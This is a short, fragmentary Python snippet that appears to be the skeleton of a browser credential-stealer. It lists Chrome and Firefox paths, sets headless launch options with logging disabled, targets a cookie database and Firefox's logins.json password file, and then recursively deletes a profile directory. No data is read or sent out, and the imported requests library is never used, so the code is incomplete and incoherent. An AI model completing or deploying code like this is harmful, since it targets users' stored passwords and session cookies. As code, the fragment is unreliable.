import requests
import shutil
browsers = ["/usr/bin/google-chrome", "/usr/bin/firefox"]
options = ["--headless", "--disable-logging", "--user-data-dir=/profile"]
cookies = "/profile/Network/Cookies"
passwords = "/Mozilla/Firefox/Profiles/profile/logins.json"
shutil.rmtree("/profile")
